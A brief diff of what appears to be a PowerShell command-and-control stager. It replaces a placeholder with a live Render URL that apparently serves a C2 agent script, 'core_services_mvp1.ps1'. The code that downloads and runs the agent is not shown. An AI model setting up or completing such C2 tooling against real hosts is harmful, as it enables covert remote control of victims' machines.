@@ -3,7 +3,7 @@
 
 # --- CONFIGURACIÓN ---
 # Modifica estas variables para que coincidan con tu entorno desplegado en Render
-$staticFilesBaseUrl = "https://TU_STATIC_FILES_RENDER_URL/files" # Ej. "https://mi-c2-files.onrender.com/files"
+$staticFilesBaseUrl = "https://exa-sw.onrender.com" # Ej. "https://mi-c2-files.onrender.com/files"
 $agentFileNameOnServer = "core_services_mvp1.ps1" 
 # --------------------
 
